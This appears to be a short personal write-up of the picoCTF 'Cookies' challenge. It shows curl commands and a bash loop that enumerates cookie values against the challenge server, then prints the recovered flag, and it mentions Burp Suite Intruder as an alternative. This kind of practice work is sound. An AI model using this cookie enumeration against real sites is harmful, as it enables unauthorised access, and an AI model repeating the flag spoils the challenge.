
Notes:
```
CURL -s (silent)
CURL -I (get only headers)
CURL -i (include)
CURL -L (makes redirections)
CURL -H sends aditional headers


GREP -q (-q, --quiet, --silent)
```

Testing the cookie from the server
```
curl -s http://mercury.picoctf.net:21485/ -I | greep Cookie Set-Cookie: name=-1; Path=/
```
Changing the name of the cookie 
```
curl -s http://mercury.picoctf.net:21485/ -H "Cookie: name=0;" -L | grep -i Cookie
```
Response
```
 <title>Cookies</title>
            <h3 class="text-muted">Cookies</h3>
          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
            <p style="text-align:center; font-size:30px;"><b>I love snickerdoodle cookies!</b></p>

```


This bash code with curl can retrieve the answer.
```
for i in {1..20}; do
for> contents=$(curl -s http://mercury.picoctf.net:21485/ -H "Cookie: name=$i; Path=/" -L)
for> if ! echo "$contents" | grep -q "Not very special"; then
for then> echo "Cookie #$i is special" 
for then> echo $contents | grep "pico" 
for then> break        
for then> fi                                                        
for> done        
Cookie #18 is special
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>


```



I can do it changing the cookie with burpsuit,using the intruder and  attack . Finally watching the responses one by one.

![[Screenshot_2023-09-23_11_11_36.png]]